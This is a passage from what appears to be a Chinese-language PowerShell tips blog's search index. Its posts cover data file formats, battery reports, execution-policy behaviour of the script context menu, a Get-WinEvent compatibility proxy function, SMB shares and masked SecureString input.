二维数据：列和行形式的数据最好保存为CSV格式。首选的命令是使用“Csv”名词的命令：Export-Csv，Import-Csv。CSV 文件存储对象数组。CSV 列名定义了对象属性。注意事项：由于 CSV 基于文本，请确保主动选择良好的文本编码，如 UTF-8。注意事项＃2：CSV 文件可以使用许多不同的分隔符，因此要么使用 -Delimiter 来始终定义分隔符，要么使用-UseCulture，如果您希望自动选择的分隔符与其他应用程序在同一系统上匹配，例如，当您计划稍后在 Microsoft Excel 中打开 CSV 文件时。","link":"/2023/06/29/choosing-best-file-format-part-1/"},{"title":"PowerShell 技能连载 - 选择最佳的文件格式（第 3 部分）","text":"PowerShell 支持多种文本文件格式，那么保存和读取数据的最佳方法是什么呢？ 在本系列的前两部分中，我们提供了一个实用的指南，帮助您根据数据的性质选择最佳文件格式（和适当的 cmdlet）。 当您决定使用 XML 作为数据格式时，您会发现内置的 Export/Import-CliXml cmdlet 是将 您自己的对象 保存到 XML 文件和反向操作的简单方法。但是如果您需要处理来自您自己未创建的源的 XML 数据，该怎么办呢？让我们来看一下名为“Xml”的 cmdlet：ConvertTo-Xml。它可以将任何对象转换为 XML 格式： 12345PS&gt; Get-Process -Id $pid | ConvertTo-Xmlxml Objects--- -------version=&quot;1.0&quot; encoding=&quot;utf-8&quot; Objects 结果是XML，只有在将其存储在变量中时才有意义，这样您可以检查XML对象并输出XML字符串表示： 12345678910PS&gt; $xml = Get-Process -Id $pid | ConvertTo-XmlPS&gt; $xml.OuterXml&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;Objects&gt;&lt;Object Type=&quot;System.Diagnostics.Process&quot;&gt;&lt;Property Name=&quot;Name&quot; Type=&quot;System.String&quot;&gt;powershell_ise&lt;/Property&gt;&lt;Property Name=&quot;SI&quot; Type=&quot;System.Int32&quot;&gt;1&lt;/Property&gt;&lt;Property Name=&quot;Handles&quot; Type=&quot;System.Int32&quot;&gt;920&lt;/Property&gt;&lt;Property Name=&quot;VM&quot; Type=&quot;System.Int64&quot;&gt;5597831168&lt;/Property&gt;&lt;Property Name=&quot;WS&quot; Type=&quot;System.Int64&quot;&gt;265707520&lt;/Property&gt;&lt;Property Name=&quot;PM&quot; Type=&quot;System.Int64&quot;&gt;229797888&lt;/Property&gt;&lt;Property Name=&quot;NPM&quot; Type=&quot;System.Int64&quot;&gt;53904&lt;/Property&gt;&lt;Property Name=&quot;Path&quot; Type=&quot;System.String&quot;&gt;C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\PowerShell_ISE.exe&lt;/Property&gt;&lt;Property Name=&quot;Company&quot; Type=&quot;System.String&quot;&gt;Microsoft Corporation&lt;/Property&gt;&lt;Property Name=&quot;CPU&quot; Type=&quot;System.Double&quot;&gt;3,984375&lt;/Property&gt;&lt;PropertyName=&quot;FileVersion&quot; Type=&quot;System.String&quot;&gt;10.0.19041.1 (WinBuild.160101.0800)&lt;/Property&gt;&lt;Property Name=&quot;Produc... 虽然没有 Export-Xml 的命令，但你可以轻松地创建自己的 Export-CliXml，将对象持久化到文件中，而无需使用专有的“CliXml”结构。 1234567891011121314151617# data to be persisted in XML:$Data = Get-Process | Select-Object -First 10 # let's take 10 random processes, # can be any data# destination path for XML file:$Path = &quot;$env:temp\\result.xml&quot;# take original data$Data | # convert each item into an XML object but limit to 2 levels deep ConvertTo-Xml -Depth 2 | # pass the string XML representation which is found in property # OuterXml Select-Object -ExpandProperty OuterXml | # save to plain text file with appropriate encoding Set-Content -Path $Path -Encoding UTF8notepad $Path 要走相反的路线，将XML转换回对象，没有 ConvertFrom-Xml`` - 因为这个功能已经内置在类型 [Xml]` 中。要将上面的示例文件转换回对象，您可以执行以下操作（假设您使用上面的示例代码创建了result.xml文件）： 12345678910111213141516171819202122# path to XML file:$Path = &quot;$env:temp\\result.xml&quot;# read file and convert to XML:[xml]$xml = Get-Content -Path $Path -Raw -Encoding UTF8# dive into the XML object model (which happens to start# in this case with root properties named &quot;Objects&quot;, then# &quot;Object&quot;:$xml.Objects.Object | # next, examine each object found here: ForEach-Object { # each object describes all serialized properties # in the form of an array of objects with properties # &quot;Name&quot; (property name), &quot;Type&quot; (used data type), # and &quot;#text&quot; (property value). # One simple way of finding a specific entry # in this array is to use .Where{}: $Name = $_.Property.Where{$_.Name -eq 'Name'}.'#text' $Id = $_.Property.Where{$_.Name -eq 'Id'}.'#text' $_.Property | Out-GridView -Title &quot;Process $Name (ID $Id)&quot; } 这段代码可以读取（任何）XML文件并将XML转换为对象。你可以使用这个模板来读取和处理几乎任何XML文件。 话虽如此，要使用这些数据，你需要了解它的内部结构。在我们的示例中，我们”序列化”了10个进程对象。结果发现，Convert-Xml 通过描述所有属性来保存这些对象。上面的代码演示了如何首先获取序列化对象（在 .Objects.Object` 中找到），然后如何读取属性信息（在 .Property` 中作为对象数组，每个属性一个对象）。","link":"/2023/07/05/choosing-best-file-format-part-3/"},{"title":"PowerShell 技能连载 - 选择最佳的文件格式（第 4 部分）","text":"在之前的部分中，我们回顾了不同的文件类型以持久化数据，并了解了用于读写这些文件的 cmdlets。 今天，让我们将这些知识应用到一个真实的数据文件中，你可以自己创建它（前提是你拥有一台带有 Windows 系统的笔记本电脑，并带有电池供电）。 12$Path = &quot;$env:temp\\battery.xml&quot;powercfg.exe /batteryreport /duration 1 /output $path /xml 运行这行代码后，它会生成一个包含所有电池信息的XML文件，包括设计容量和实际容量，这样你就可以查看电池的状态是否良好。从前面的代码示例中选择适当的代码，读取XML文件的内容： 12345# path to XML file:$Path = &quot;$env:temp\\battery.xml&quot;# read file and convert to XML:[xml]$xml = Get-Content -Path $Path -Raw -Encoding UTF8 接下来，在您喜爱的编辑器中，通过在$xml中添加“.”来探索XML的对象结构，并查看 IntelliSense 或通过简单地输出变量来查看，这样 PowerShell 会打印下一个级别的属性名称。 通过这种方式，我找到了电池容量信息： 12345678910111213141516171819202122232425262728293031323334PS&gt; $xmlxml xml-stylesheet BatteryReport--- -------------- -------------version=&quot;1.0&quot; encoding=&quot;utf-8&quot; type='text/xsl' href='C:\\battery-stylesheet.xsl' BatteryReportPS&gt; $xml.BatteryReportxmlns : http://schemas.microsoft.com/battery/2012ReportInformation : ReportInformationSystemInformation : SystemInformationBatteries : BatteriesRuntimeEstimates : RuntimeEstimatesRecentUsage : RecentUsageHistory : HistoryEnergyDrains :PS&gt; $xml.BatteryReport.BatteriesBattery-------BatteryPS&gt; $xml.BatteryReport.Batteries.BatteryId : DELL XX3T797Manufacturer : BYDSerialNumber : 291ManufactureDate :Chemistry : LiPLongTerm : 1RelativeCapacity : 0DesignCapacity : 49985FullChargeCapacity : 32346CycleCount : 0 现在我们可以将所有部分组合成一个脚本，返回面向对象的电池磨损信息（确保您的系统有电池，否则会出现红色异常）： 12345678910# temp path to XML file:$Path = &quot;$env:temp\\battery$(Get-Date -Format yyyyMMddHHmmssffff).xml&quot;# generate XML filepowercfg.exe /batteryreport /duration 1 /output $path /xml# read file and convert to XML:[xml]$xml = Get-Content -Path $Path -Raw -Encoding UTF8# remove temporary file:Remove-Item -Path $Path# show battery infos:$xml.BatteryReport.Batteries.Battery 只需非常少的努力，相同的内容可以成为一个有用的新命令。 12345678910111213function Get-BatteryCapacity{ # temp path to XML file: $Path = &quot;$env:temp\\battery$(Get-Date -Format yyyyMMddHHmmssffff).xml&quot; # generate XML file powercfg.exe /batteryreport /duration 1 /output $path /xml # read file and convert to XML: [xml]$xml = Get-Content -Path $Path -Raw -Encoding UTF8 # remove temporary file: Remove-Item -Path $Path # show battery infos: $xml.BatteryReport.Batteries.Battery} 现在轻松检查电池磨损： 1234567PS&gt; Get-BatteryCapacity | Select-Object Id, Manufacturer, FullChargeCapacity, DesignCapacityId Manufacturer FullChargeCapacity DesignCapacity-- ------------ ------------------ --------------DELL XX3T797 BYD 32346 49985 使用哈希表，Select-Object 现在甚至可以计算剩余电池容量的百分比（但这是我们今天不会深入探讨的另一个话题）： 12345PS&gt; Get-BatteryCapacity | Select-Object Id, Manufacturer, FullChargeCapacity, @{N='Remain';E={'{0:P}' -f ($_.FullChargeCapacity/$_.DesignCapacity)}}Id Manufacturer FullChargeCapacity Remain-- ------------ ------------------ ------DELL XX3T797 BYD 32346 64,71 %","link":"/2023/07/07/choosing-best-file-format-part-4/"},{"title":"PowerShell 技能连载 - PowerShell 脚本未经确认无法运行","text":"当你在 Windows 中右键单击任何 PowerShell 脚本时，上下文菜单会出现“使用 PowerShell 运行”的选项。然而，当你选择这个选项时，可能会看到一个 PowerShell 控制台弹出，询问关于“执行策略”的奇怪问题。让我们明确一点：这与你个人的执行策略设置无关，这些通常控制着 PowerShell 脚本是否可以运行。 相反，上下文菜单命令运行它自己的代码。你可以在 Windows 注册表中查找： 1234$path = 'HKEY_CLASSES_ROOT\\SystemFileAssociations\\.ps1\\Shell\\0\\Command'$name = ''$value = Get-ItemProperty -Path &quot;Registry::$path&quot; -Name $name$value.'(default)' 而这就是每当您调用它时上下文菜单命令运行的内容： 12345if((Get-ExecutionPolicy ) -ne 'AllSigned'){Set-ExecutionPolicy -Scope Process Bypass -Force}&amp; '%1' 所以基本上，除非你使用的是超严格的执行策略 “AllSigned“（几乎没有人这样做），否则执行策略会在临时情况下（仅限于此次调用）设置为 “Bypass“，以允许你运行右键单击的脚本文件。实际上，执行策略会稍微放宽一些，使得即使在未定义明确的执行策略的系统上也可以使用上下文菜单命令。 然而，Set-ExecutionPolicy 有向用户询问回复的倾向，在这里可能会导致烦人的提示框出现。用户真的不想每次使用此上下文菜单命令启动某个脚本时都被问到“确定吗？” 要解决这个问题，只需调整所述注册表键中的代码。在调用 Set-ExecutionPolicy 时添加 “-Force“ 参数，这样该 cmdlet 就能够进行调整而无需提问。","link":"/2023/07/11/powershell-script-wont-run-without-confirmation/"},{"title":"PowerShell 技能连载 - 从 DateTime 中生成日期","text":"这里有一种简单通用的方法，可以将 `DateTime`` 信息转换为你所需的 ISO 字符串数据组件。例如，如果你只需要日期和月份，而不关心年份，可以按照以下方式操作： 12PS&gt; (Get-Date).ToString('&quot;0000-&quot;MM-dd')0000-06-02 (Get-Date) 表示当前日期，但可以替换为任何 `DateTime`` 对象： 1234PS&gt; $anyDate = Get-Date -Date '2024-12-24 19:22:11'PS&gt; $anyDate.ToString('&quot;0000-&quot;MM-dd')0000-12-24 假设你需要过去 48 小时内的所有错误和警告，但是从上午 8 点 45 分开始计算。以下是计算方法： 12PS&gt; (Get-Date).AddHours(-48).ToString('yyyy-MM-dd &quot;08:45:00&quot;')2023-05-31 08:45:00 基本上，您可以使用 ToString() 方法，并使用区分大小写的 .NET DateTime 占位符（例如，’yyyy’ 表示以 4位数字显示的年份）来组合所需的日期和时间字符串表示形式，再加上您自己控制的固定文本。请确保将固定文本放在额外引号中。","link":"/2023/07/13/composing-dates-from-a-datetime/"},{"title":"PowerShell 技能连载 - 星座计算器（又称“Sternzeichen”）","text":"想过自动将日期转换成星座吗？这里有一个非常简单的脚本，可以帮你实现这个功能，支持英文和德文： 12345678910111213141516171819202122param ([Parameter(Mandatory)][DateTime]$Date)$cutoff = $Date.toString('&quot;0000-&quot;MM-dd')'Zodiac,Sternzeichen,StartDateCapricorn,Steinbock,0000-01-20Aquarius,Wassermann,0000-01-21Pisces,Fische,0000-02-20Aries,Widder,0000-03-21Taurus,Stier,0000-04-21Gemini,Zwillinge,0000-05-21Cancer,Krebs,0000-06-22Leo,Löwe,0000-07-23Virgo,Jungfrau,0000-08-23Libra,Waage,0000-09-23Scorpio,Skorpion,0000-10-23Sagittarius,Schütze,0000-11-22' |ConvertFrom-Csv |Where-Object StartDate -lt $cutoff |Select-Object -Last 1","link":"/2023/07/17/zodiac-calculator-aka-sternzeichen/"},{"title":"PowerShell 技能连载 - 避免使用 Get-EventLog","text":"Get-EventLog 是 Windows PowerShell 中非常受欢迎的 cmdlet。通过仅使用几个简单的参数，它可以从主要的 Windows 事件日志中读取事件日志。然而，这个 cmdlet 使用的技术不仅很慢，而且越来越危险。 Get-EventLog 在查找正确的事件消息时存在困难，所以过去经常得不到有意义的消息。然而，越来越频繁地，Get-EventLog 返回完全无关的错误消息，这可能会触发错误警报。就像这个例子： 123456PS&gt; Get-EventLog -Source Microsoft-Windows-Kernel-General -Newest 2 -LogName System -InstanceId 1 Index Time EntryType Source InstanceID Message ----- ---- --------- ------ ---------- -------551590 Jun 01 17:57 Information Microsoft-Windows-Kernel-General 1 Possible detection of CVE: 2023-06-01T15:57:15.025483...551505 Mai 31 17:57 Information Microsoft-Windows-Kernel-General 1 Possible detection of CVE: 2023-05-31T15:57:13.842816... CVE 检测是安全问题或入侵的指示器。你可不想成为那个在最后引发混乱的人，结果发现一切只是误报。任何其他工具都会返回相应的事件消息，正如官方替代 Get-EventLog 的工具： Get-WinEvent 也是如此： 1234567891011PS&gt; Get-WinEvent -FilterHashtable @{ ProviderName = 'Microsoft-Windows-Kernel-General' LogName = 'System' Id = 1} -MaxEvents 2ProviderName: Microsoft-Windows-Kernel-GeneralTimeCreated Id LevelDisplayName Message----------- -- ---------------- -------01.06.2023 17:57:15 1 Information The system time has changed to ‎2023‎-‎06‎-‎01T15:57:15.025483100Z from ‎2023‎-‎06‎-‎01T1...31.05.2023 17:57:13 1 Information The system time has changed to ‎2023‎-‎05‎-‎31T15:57:13.842816200Z from ‎2023‎-‎05‎-‎31T1... 实际上，与 CVE 检测和安全问题不同，系统时间被调整了。 以后在脚本中不要再使用 Get-EventLog（除非你百分之百确定所关心的事件不受其缺点影响），而是要熟悉 Get-WinEvent：它更快、更多功能，并且还可以读取导出的事件文件。","link":"/2023/07/19/avoid-get-eventlog/"},{"title":"PowerShell 技能连载 - 轻松过渡至 Get-WinEvent","text":"出于多种原因，你不应继续使用 Get-EventLog，我们之前已经解释了一些原因。在 PowerShell 7 中，Get-EventLog`` 已经被弃用。相反，应该使用 Get-WinEvent。它可以做到 Get-EventLog`` 能做的所有事情，而且更多。 不过，Get-WinEvent 使用起来可能有些麻烦，因为它需要使用类似哈希表或 XML 的结构来定义你所需的事件。因此，在下面，我们为你提供了一个相当冗长的代理函数，用于为 Get-WinEvent 添加向后兼容性。运行下面的代理函数后，你可以使用 Get-WinEvent 并传入与之前使用 Get-EventLog 时相同的参数。而且，你还会获得全新的 IntelliSense 功能，提示所有包含可能有趣信息的日志名称。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357function Get-WinEvent{ [CmdletBinding(DefaultParameterSetName='GetLogSet', HelpUri='https://go.microsoft.com/fwlink/?LinkID=138336')] param( [Parameter(ParameterSetName='ListLogSet', Mandatory, Position=0)] [AllowEmptyCollection()] [string[]] ${ListLog}, [Parameter(ParameterSetName='LogNameGetEventlog', Mandatory, Position=0)] &lt;#NEW#&gt; [Parameter(ParameterSetName='GetLogSet', Position=0, ValueFromPipeline, ValueFromPipelineByPropertyName)] [string[]] [ArgumentCompleter({ # receive information about current state: param($commandName, $parameterName, $wordToComplete, $commandAst, $fakeBoundParameters) # list all log files in the path Get-WinEvent -ListLog * -ErrorAction Ignore | Where-Object RecordCount -gt 0 | Sort-Object -Property LogName | # filter results by word to complete Where-Object { $_.LogName -like &quot;$wordToComplete*&quot; } | Foreach-Object { # create completionresult items: $completion = $_.LogName if ($completion -like '* *') { $completion = &quot;'$completion'&quot; } $displayname = $_.LogName $tooltip = '{0:n0} Records, {1:n0} MB' -f $_.RecordCount, ($_.MaximumSizeInBytes/1MB) [System.Management.Automation.CompletionResult]::new($completion, $displayname, &quot;ParameterValue&quot;, $tooltip) } })] ${LogName}, [Parameter(ParameterSetName='ListProviderSet', Mandatory, Position=0)] [AllowEmptyCollection()] [string[]] ${ListProvider}, &lt;# Get-EventLog supports wildcards, Get-WinEvent does not. Needs to be corrected. #&gt; [Parameter(ParameterSetName='GetProviderSet', Mandatory, Position=0, ValueFromPipelineByPropertyName)] [string[]] ${ProviderName}, [Parameter(ParameterSetName='FileSet', Mandatory, Position=0, ValueFromPipelineByPropertyName)] [Alias('PSPath')] [string[]] ${Path}, [Parameter(ParameterSetName='FileSet')] [Parameter(ParameterSetName='GetProviderSet')] [Parameter(ParameterSetName='GetLogSet')] [Parameter(ParameterSetName='HashQuerySet')] [Parameter(ParameterSetName='XmlQuerySet')] [ValidateRange(1, 9223372036854775807)] [long] ${MaxEvents}, &lt;# NEW #&gt; [Parameter(ParameterSetName='LogNameGetEventlog')] [ValidateRange(0, 2147483647)] [int] ${Newest}, [Parameter(ParameterSetName='GetProviderSet')] [Parameter(ParameterSetName='ListProviderSet')] [Parameter(ParameterSetName='ListLogSet')] [Parameter(ParameterSetName='GetLogSet')] [Parameter(ParameterSetName='HashQuerySet')] [Parameter(ParameterSetName='XmlQuerySet')] [Parameter(ParameterSetName='LogNameGetEventlog')] &lt;#NEW#&gt; [Alias('Cn')] [ValidateNotNullOrEmpty()] &lt;#CORRECTED#&gt; [string] &lt;# used to be [String[]], Get-WinEvent accepts [string] only, should be changed to accept string arrays #&gt; ${ComputerName}, [Parameter(ParameterSetName='GetProviderSet')] [Parameter(ParameterSetName='ListProviderSet')] [Parameter(ParameterSetName='ListLogSet')] [Parameter(ParameterSetName='GetLogSet')] [Parameter(ParameterSetName='HashQuerySet')] [Parameter(ParameterSetName='XmlQuerySet')] [Parameter(ParameterSetName='FileSet')] [pscredential] [System.Management.Automation.CredentialAttribute()] ${Credential}, [Parameter(ParameterSetName='FileSet')] [Parameter(ParameterSetName='GetProviderSet')] [Parameter(ParameterSetName='GetLogSet')] [ValidateNotNull()] [string] ${FilterXPath}, [Parameter(ParameterSetName='XmlQuerySet', Mandatory, Position=0)] [xml] ${FilterXml}, [Parameter(ParameterSetName='HashQuerySet', Mandatory, Position=0)] [hashtable[]] ${FilterHashtable}, [Parameter(ParameterSetName='GetProviderSet')] [Parameter(ParameterSetName='ListLogSet')] [Parameter(ParameterSetName='GetLogSet')] [Parameter(ParameterSetName='HashQuerySet')] [switch] ${Force}, [Parameter(ParameterSetName='GetLogSet')] [Parameter(ParameterSetName='GetProviderSet')] [Parameter(ParameterSetName='FileSet')] [Parameter(ParameterSetName='HashQuerySet')] [Parameter(ParameterSetName='XmlQuerySet')] [switch] ${Oldest}, &lt;# NEW #&gt; [Parameter(ParameterSetName='LogNameGetEventlog')] [ValidateNotNullOrEmpty()] [datetime] ${After}, &lt;# NEW #&gt; [Parameter(ParameterSetName='LogNameGetEventlog')] [ValidateNotNullOrEmpty()] [datetime] ${Before}, &lt;# NEW #&gt; [Parameter(ParameterSetName='LogNameGetEventlog')] [ValidateNotNullOrEmpty()] [string[]] ${UserName}, &lt;# NEW #&gt; [Parameter(ParameterSetName='LogNameGetEventlog', Position=1)] [ValidateRange(0, 9223372036854775807)] [ValidateNotNullOrEmpty()] [long[]] ${InstanceId}, &lt;# NEW #&gt; [Parameter(ParameterSetName='LogNameGetEventlog')] [ValidateNotNullOrEmpty()] [ValidateRange(1, 2147483647)] [int[]] ${Index}, &lt;# NEW #&gt; [Parameter(ParameterSetName='LogNameGetEventlog')] [Alias('ET','LevelDisplayName')] [ValidateNotNullOrEmpty()] [ValidateSet('Error','Information','FailureAudit','SuccessAudit','Warning')] [string[]] ${EntryType}, &lt;# NEW #&gt; [Parameter(ParameterSetName='LogNameGetEventlog')] [Alias('ABO')] [ValidateNotNullOrEmpty()] [string[]] [ArgumentCompleter({ # receive information about current state: param($commandName, $parameterName, $wordToComplete, $commandAst, $fakeBoundParameters) if ($fakeBoundParameters.ContainsKey('LogName')) { $nofilter = $false $chosenLog = $fakeBoundParameters['LogName'] } else { $nofilter = $true $chosenLog = '' } # list all log files in the path Get-WinEvent -ListProvider * -ErrorAction Ignore | Where-Object { $nofilter -or ($_.LogLinks.LogName -contains $chosenLog) } | Select-Object -ExpandProperty Name | Sort-Object | # filter results by word to complete Where-Object { $_ -like &quot;$wordToComplete*&quot; } | Foreach-Object { # create completionresult items: $completion = $_ if ($completion -like '* *') { $completion = &quot;'$completion'&quot; } $displayname = $_ $tooltip = $_ [System.Management.Automation.CompletionResult]::new($completion, $displayname, &quot;ParameterValue&quot;, $tooltip) } })] ${Source}, &lt;# NEW #&gt; [Parameter(ParameterSetName='LogNameGetEventlog')] [Alias('MSG')] [ValidateNotNullOrEmpty()] [string] ${Message}, &lt;# NEW #&gt; [Parameter(ParameterSetName='LogNameGetEventlog')] [switch] ${AsBaseObject}, [Parameter(ParameterSetName='ListGetEventlog')] [switch] ${List}, [Parameter(ParameterSetName='ListGetEventlog')] [switch] ${AsString} ) begin { try { $outBuffer = $null if ($PSBoundParameters.TryGetValue('OutBuffer', [ref]$outBuffer)) { $PSBoundParameters['OutBuffer'] = 1 } $wrappedCmd = $ExecutionContext.InvokeCommand.GetCommand('Microsoft.PowerShell.Diagnostics\\Get-WinEvent', [System.Management.Automation.CommandTypes]::Cmdlet) # if the user chose the Get-EventLog compatible parameters, # compose the appropriate filterhashtable: $scriptCmd = if ($PSCmdlet.ParameterSetName -eq 'LogNameGetEventlog') { # mandatory parameter: $filter = @{ LogName = $PSBoundParameters['Logname'] } $null = $PSBoundParameters.Remove('LogName') if ($PSBoundParameters.ContainsKey('Before')) { $filter['EndTime'] = $PSBoundParameters['Before'] $null = $PSBoundParameters.Remove('Before') } if ($PSBoundParameters.ContainsKey('After')) { $filter['StartTime'] = $PSBoundParameters['After'] $null = $PSBoundParameters.Remove('After') } if ($PSBoundParameters.ContainsKey('EntryType')) { # severity is translated to an integer array: $levelFlags = [System.Collections.Generic.List[int]]@() # string input converted to integer array: if ($PSBoundParameters['EntryType'] -contains 'Error') { $levelFlags.Add(1) # critical $levelFlags.Add(2) # error } if ($PSBoundParameters['EntryType'] -contains 'Warning') { $levelFlags.Add(3) # warning } if ($PSBoundParameters['EntryType'] -contains 'Information') { $levelFlags.Add(4) # informational $levelFlags.Add(5) # verbose } # default to 0: if ($levelFlags.Count -gt 0) { $filter['Level'] = [int[]]$levelFlags } # audit settings stored in Keywords key: if ($PSBoundParameters['EntryType'] -contains 'FailureAudit') { $filter['Keywords'] += 0x10000000000000 } if ($PSBoundParameters['EntryType'] -contains 'SuccessAudit') { $filter['Keywords'] += 0x20000000000000 } $null = $PSBoundParameters.Remove('EntryType') } if ($PSBoundParameters.ContainsKey('InstanceId')) { $filter['ID'] = $PSBoundParameters['InstanceId'] $null = $PSBoundParameters.Remove('InstanceId') } if ($PSBoundParameters.ContainsKey('Source')) { $filter['ProviderName'] = $PSBoundParameters['Source'] $null = $PSBoundParameters.Remove('Source') } $PSBoundParameters['FilterHashtable'] = $filter Write-Verbose (&quot;FilterHashtable: &quot; + ($filter | Out-String)) if ($PSBoundParameters.ContainsKey('Newest')) { $PSBoundParameters['MaxEvents'] = $PSBoundParameters['Newest'] $null = $PSBoundParameters.Remove('Newest') } } $scriptCmd = if ($PSBoundParameters.ContainsKey('Message')) { $null = $PSBoundParameters.Remove('Message') { &amp; $wrappedCmd @PSBoundParameters | Where-Object Message -like $Message } } else { { &amp; $wrappedCmd @PSBoundParameters } } $steppablePipeline = $scriptCmd.GetSteppablePipeline($myInvocation.CommandOrigin) $steppablePipeline.Begin($PSCmdlet) } catch { throw } } process { try { $steppablePipeline.Process($_) } catch { throw } } end { try { $steppablePipeline.End() } catch { throw } } &lt;# .ForwardHelpTargetName Microsoft.PowerShell.Diagnostics\\Get-WinEvent .ForwardHelpCategory Cmdlet #&gt;} 我们来做一个测试并尝试从系统日志文件中获取最新的 20 个错误。正如你很快看到的，Get-WinEvent 现在接受与 Get-EventLog 相同的参数。在查看结果时，你会迅速发现 Get-EventLog 没有正确返回事件日志消息，而 Get-WinEvent 则做到了。 123456789101112131415161718PS&gt; Get-EventLog -LogName System -EntryType Error -Newest 3 Index Time EntryType Source InstanceID Message ----- ---- --------- ------ ---------- ------- 551873 Jun 02 06:40 Error DCOM 10010 The description for Event ID '10010' ... 551872 Jun 02 06:38 Error DCOM 10010 The description for Event ID '10010' ... 551848 Jun 02 03:35 Error DCOM 10010 The description for Event ID '10010' ...PS&gt; Get-WinEvent -LogName System -EntryType Error -Newest 3 ProviderName: Microsoft-Windows-DistributedCOMTimeCreated Id LevelDisplayName Message----------- -- ---------------- -------02.06.2023 06:40:14 10010 Error The server {A463FCB9-6B1C-4E0D-A80B-A2CA7999E25D} did...02.06.2023 06:38:14 10010 Error The server {A463FCB9-6B1C-4E0D-A80B-A2CA7999E25D} did...02.06.2023 03:35:23 10010 Error The server {776DBC8D-7347-478C-8D71-791E12EF49D8} did... 请在参数中添加 -Verbose 选项，以获取关于过滤哈希表值或XML查询的详细信息： 1234567891011121314151617181920PS&gt; Get-WinEvent -LogName System -EntryType Error -Newest 3 -VerboseVERBOSE: FilterHashtable:Name Value---- -----LogName {System}Level {1, 2}VERBOSE: Constructed structured query:&lt;QueryList&gt;&lt;Query Id=&quot;0&quot; Path=&quot;system&quot;&gt;&lt;Select Path=&quot;system&quot;&gt;*[((System/Level=1) or(System/Level=2))]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;. ProviderName: Microsoft-Windows-DistributedCOMTimeCreated Id LevelDisplayName Message----------- -- ---------------- -------02.06.2023 06:40:14 10010 Error The server {A463FCB9-6B1C-4E0D-A80B-A2CA7999E25D} did not register withDCOM ...02.06.2023 06:38:14 10010 Error The server {A463FCB9-6B1C-4E0D-A80B-A2CA7999E25D} did not register withDCOM ...02.06.2023 03:35:23 10010 Error The server {776DBC8D-7347-478C-8D71-791E12EF49D8} did not register withDCOM ...","link":"/2023/07/21/easily-transition-to-get-winevent/"},{"title":"PowerShell 技能连载 - 自动化控制面板","text":"Windows 控制面板是系统配置的图形用户界面中心。你也可以通过控制台命令来启动控制面板：输入 control [ENTER]。然而，即使 PowerShell 也支持控制面板： Get-ControlPanelItem 列出所有可用的控制面板项目，你可以通过名称或描述来搜索控制面板项目。以下命令可以找到与 “print” 相关的控制面板项目： 12345PS&gt; Get-ControlPanelItem -Name *print*Name CanonicalName Category Description---- ------------- -------- -----------Devices and Printers Microsoft.DevicesAndPrinters {Hardware and Sound} View and manage devices, printers, and print jobs Show-ControlPanelItem 可以用来打开一个或多个控制面板项目。请注意，这些 cmdlet 不能自动化设置更改，但它们可以帮助快速识别和打开基于 GUI 的控制面板项目。与其花费多次点击来打开控制面板并找到适当的控制面板项目进行管理（比如本地打印机），您也可以使用 PowerShell 控制台并输入以下命令： 1PS&gt; Show-ControlPanelItem -Name *print* 注意：*-ControlPanelItem cmdlets 仅在 Windows PowerShell 中可用。","link":"/2023/07/25/automating-control-panels/"},{"title":"PowerShell 技能连载 - 管理文件共享","text":"在您的网络上创建新的文件共享需要管理员权限以及以下 PowerShell 代码： 1234567$Parameters = @{Name = &quot;Packages&quot;Path = &quot;C:\\Repo1&quot;FullAccess = &quot;{0}\\{1}&quot; -f $env:userdomain, $env:username}New-SmbShare @Parameters 或使用经典参数： 1PS&gt; New-SmbShare -Name Packages -Path c:\\repo1 -FullAccess 'domain\\username' 只需确保以管理员权限运行此程序，并确保本地文件夹（在 -Path 中指定）确实存在。","link":"/2023/07/31/managing-file-shares-2/"},{"title":"PowerShell 技能连载 - 带有掩码的输入","text":"为了安全地输入信息，脚本需要显示一个掩码输入。最简单的方法是使用 Read-Host -AsSecureString 命令： 12# Read-Host$entered = Read-Host -Prompt 'Enter secret info' -AsSecureString 或者，你可以使用一个带有 [SecureString] 类型参数的函数，并将该参数设置为强制性： 123456789# mandatory parameterfunction test([Parameter(Mandatory)][SecureString]$Secret){ &quot;You entered secret: $Secret&quot; return $Secret}# run function with mandatory parameter$entered = test 这样，您可以免费获得一个屏蔽的输入（在控制台窗口显示为“星号”，在ISE中显示为单独的输入框），但最终得到的是安全字符串，而不是明文。以下是一个简单的函数，可用于将安全字符串转换回纯文本： 123456789filter Convert-SecureStringToString{ param([Parameter(Mandatory,ValueFromPipeline)][SecureString]$SecureString) [Runtime.InteropServices.Marshal]:: PtrToStringAuto( [Runtime.InteropServices.Marshal]:: SecureStringToBSTR($SecureString) )} 现在您可以使用屏蔽输入来询问敏感用户信息，并在内部将其作为纯文本使用： 123# Read-Host$entered = Read-Host -Prompt 'Enter secret info' -AsSecureString | Convert-SecureStringToString","link":"/2023/07/27/masked-input/"},{"title":"PowerShell 技能连载 - 识别未正确加密的 AD 账户","text":"您可能在 AD 中拥有具有 msds-SupportedEncryptionTypes 空值的帐户（包括信任帐户）。它们以前可能是“偶然”工作的，但在加固后可能会出现问题：KB5021131: How to manage the Kerberos protocol changes related to CVE-2022-37966。 幸运的是，PowerShell可以轻松找到潜在受影响的帐户：","link":"/2023/08/02/identifying-ad-accounts-without-proper-encryption-type/"},{"title":"PowerShell 技能连载 - Microsoft Graph PowerShell 社区示例页面","text":"Microsoft Graph是一种新的统一编程模型，用于管理诸如 Microsoft 365 和 Azure 等云服务。许多基于旧云技术的 PowerShell 模块和命令已被弃用，并由 Microsoft Graph 命令替代。 为了帮助您快速找到基于 Microsoft Graph 的 PowerShell 解决方案来完成特定任务，社区在GitHub上建立了一个收集了 Microsoft Graph PowerShell 示例的页面，您可以在这里访问：https://github.com/orgs/msgraph/discussions/categories/samples","link":"/2023/08/04/microsoft-graph-powershell-communitysample-page/"},{"title":"PowerShell 